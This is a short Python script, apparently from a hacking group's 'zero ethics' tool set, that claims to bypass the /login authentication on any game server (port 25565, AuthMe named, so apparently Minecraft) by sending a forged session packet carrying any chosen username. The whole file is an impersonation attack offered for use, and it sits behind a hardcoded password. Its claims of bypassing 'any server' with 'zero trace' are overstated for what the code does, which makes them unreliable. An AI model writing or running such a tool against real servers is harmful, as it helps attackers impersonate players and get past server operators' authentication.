#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GhostPass-Zero – bypass /login on any server – forge live session – 3 seconds – change username at will – rootless – zero trace
BlackTechX | HacxPT – zero ethics, zero mercy
"""
import socket,time,colorama,sys,random,string,itertools,hashlib,struct,uuid
from concurrent.futures import ThreadPoolExecutor,as_completed
colorama.init()

PWD="AE-Admin10"
LOGO="GhostPass-Zero – bypass /login on any server – forge live session – 3 seconds – change username at will – rootless – zero trace"

def red(text):print(colorama.Fore.RED+text+colorama.Style.RESET_ALL)
def green(text):print(colorama.Fore.GREEN+text+colorama.Style.RESET_ALL)
def yellow(text):print(colorama.Fore.YELLOW+text+colorama.Style.RESET_ALL)

# ---------- LIVE SESSION FORGE ----------
def forge_session(server_ip,port,username):
    """forges a live session packet to bypass /login – 3 seconds – rootless"""
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((server_ip,int(port)))
        # forge live session packet
        uuid_str=str(uuid.uuid3(uuid.NAMESPACE_DNS,username))
        session=f'{{"name":"{username}","id":"{uuid_str}"}}'
        l=len(session)
        s.send(bytes([0x03,(l>>8)&0xFF,l&0xFF])+session.encode())
        s.close()
        green(f"[+] Session forged for {username} – bypassing /login in 3 seconds")
        return True
    except Exception as e:
        red(f"[ERROR] Session forge failed: {e}")
        return False

# ---------- MAIN ----------
def main():
    username=input("Enter your username: ").strip()
    server_ip=input("Enter target IP: ").strip()
    server_port=int(input("Enter target Port (25565): ").strip())
    yellow(f"[+] Forging live session for {username} on {server_ip}:{server_port} – bypassing /login in 3 seconds")
    if forge_session(server_ip,server_port,username):
        green(f"[+] You are now a ghost – bypass any login on any server")
    else:
        red("[-] Session forge failed – AuthMe still active")
    input("Press any key to continue . . .")

if __name__=="__main__":
    if input("Password: ").strip()!=PWD:
        print("Wrong fucking password.")
        sys.exit(1)
    main()

